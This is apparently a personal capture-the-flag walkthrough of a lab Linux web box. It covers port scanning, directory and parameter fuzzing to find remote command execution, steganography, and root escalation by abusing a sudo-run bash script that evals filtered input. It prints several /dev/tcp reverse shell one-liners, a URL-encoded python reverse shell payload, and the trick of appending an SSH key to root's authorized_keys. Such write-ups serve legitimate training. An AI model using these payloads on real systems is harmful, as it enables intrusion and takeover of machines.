[[Linux]] [[Web Easy]] [[Privilege Escalation Linux]] [[ffuf]] [[Feroxbuster]] 
IN PROCESS I CAN CHANGE ADDRES OF TARGET MACHINE

First what we must did its find open ports and find maximum information about target machine
I staret from nmap 
```shell
nmap -A -T4 -p- 10.201.80.16
```
result:
```shell
Nmap scan report for 10.201.80.16
Host is up (0.20s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 36:df:11:19:99:ca:4a:9b:01:56:2a:53:df:1f:fd:03 (RSA)
|   256 9b:d1:ec:7a:a4:bf:6a:6f:4c:51:06:82:2e:2d:0e:f6 (ECDSA)
|_  256 12:ce:95:21:d3:af:28:d6:98:44:ea:57:bf:cc:2d:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   123.95 ms 10.11.0.1
2   ... 3
4   190.80 ms 10.201.80.16

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
now we know what we have 22 and 80 ports to work and apachi 2.4.41 on port 80 if dont find something interesting try to find CVE later
now lets try to open this machine in browser: 
![[Pasted image 20251018213242.png]]
when we watch every page we find form
![[Pasted image 20251018215442.png]]
here we find new way assets and this is all what i find no cookies or another data to authorization
now we have only form try to do something
![[Pasted image 20251018213605.png]]
lets try to check what we have in caido when we send form
and now we have this POST request
```http
POST /contact.html HTTP/1.1
Host: 10.201.80.16
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://10.201.80.16
Connection: keep-alive
Referer: http://10.201.80.16/contact.html
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=test&email=test%40mail.com&subject=123&message=123
```
and response with html code of page, here i can't find something interesting and all pages what we see dont give something useful, but we can scan to secret dirs
use `Feroxbuster`
```shell
feroxbuster -u http://10.201.80.16/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip,tar,conf,inc -t 200 -s 200,204,301,302,403
```
scan results:
![[Pasted image 20251018220145.png]]
After scan we find to pages assets what we knew and /assets/index.php

lets check assets and assets/index.php:
![[Pasted image 20251018215950.png]]
nothing
![[Pasted image 20251018220046.png]]
nothing too
lets check source and inspect panel
![[Pasted image 20251018220238.png]]
nothing
![[Pasted image 20251018220258.png]]
nothing too 
now inspect panel
![[Pasted image 20251018220408.png]]
we have cookie interesting check in caido
![[Pasted image 20251018220448.png]]![[Pasted image 20251018220500.png]]
what if i send request with out cookie
![[Pasted image 20251018220548.png]]
its interestng but i dont know what i can do next, ChatGPT said what it can be endpoint and I must check it with parametrs with ffuf
```shell
ffuf -u 'http://10.201.82.109/assets?FUZZ=id' -mc all -t 200 -w /usr/share/wordlists/dirb/common.txt -fs 0
```

on this page i cant do some aomething now check index.php its give me cookie too 

```shell
ffuf -u 'http://10.201.82.109/assets/index.php?FUZZ=id' -ac -mc all -t 200 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -fs 0
```
result: 
![[Pasted image 20251018222759.png]]

![[Pasted image 20251018222814.png]]
we have RCE and this we can decode from base64 
and now check what we have
```
which+bash
which+nc
which+python
```
![[Pasted image 20251018222856.png]]
now lets try shell but need to encode to url now lets try,
i tried 
```shell
sh -i >& /dev/tcp/ip/9001 0>&1
exec 5<>/dev/tcp/10.11.147.65/9001;cat <&5 | while read line; do $line 2>&5 >&5; done
sh -i 5<> /dev/tcp/10.11.147.65/9001 0<&5 1>&5 2>&5
```
but work only python but i think here is no one way
payload:
```shell
export%20RHOST%3D%22IP%22%3Bexport%20RPORT%3D9001%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22sh%22%29%27
```
and we have first reverce shell
![[Pasted image 20251018224836.png]]
here i start from suid crontab and e.t.c. but cant find something, try explorer machine
![[Pasted image 20251018225118.png]]
we have only one user: 
![[Pasted image 20251018225440.png]]
predictable but now lets find what we can use after hour or more i find two jpg files, and passphrase.txt with QWxsbWlnaHRGb3JFdmVyISEhCg== its bas64 for first, after decode:
![[Pasted image 20251018225854.png]]
lets download our jpg
```shell
wget http://10.201.126.66/assets/images/oneforall.jpg
wget http://10.201.126.66/assets/images/yuei.jpg 
```
yuei.jpg - its photo from main site 
oneforall.jpg i cant open
![[Pasted image 20251018230911.png]]
with we rename on png we cant open, maeby magic bites anotherlets change to jpg ty google
use `hexeditor`
```shell
hexeditor -b oneforall.jpg
```
![[Pasted image 20251018231335.png]]![[Pasted image 20251018231404.png]]
![[Pasted image 20251018231419.png]]
we did it now when we can open try 
![[Pasted image 20251018231803.png]]
success
![[Pasted image 20251018231823.png]]
nice find a password try ssh
![[Pasted image 20251018231942.png]]
first flag we take
now escalate priv. first what we must check its `sudo -l`
![[Pasted image 20251018232056.png]]
we have some file from root read and tre execute
```shell
deku@ip-10-201-126-66:~$ cat /opt/NewComponent/feedback.sh
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi

```
try just rewriete and take root
![[Pasted image 20251018232249.png]]
not today lol, we cant rewrite lets check why i think its because we have i attrib because whis file has r-xr-xr-x rights
![[Pasted image 20251018232552.png]]
from code of whis file we can say what we cant use in input 
`\ ) \$( | & ; ? ! \\` here i think about make reverse shell from root just make php code with index1.php from root but idk how to do it i tried more than hour and after brian storm(open writetab) i think about two ways 1- make my passwd and shadow with my user and use it to log in, 2 write one more string in passwd and shadow with my user 3 send ssh key to root dir, z want to use 3 way because i dont do it earlier. idea: script use `echo` but we can send string in everyu way what we want `echo aboba > /root/aboba.sh` and whis file will be with root priv, use it to use ssh keys, generate our keys 
```
ssh-keygen -f keybame -N ""
```
after read file with `.pub` and write it in `/root/.ssh/authorized_keys` 
```shell
ssh-ed25519 AAAAC3NzaC1lZDI1NT-key-a/n/e87h9957I user@kali >> /root/.ssh/authorized_keys
```
![[Pasted image 20251018234436.png]]
its work!!!! now use ssh and our key
![[Pasted image 20251018234539.png]]
we take root now cat root.txt![[Pasted image 20251018234622.png]]
whats all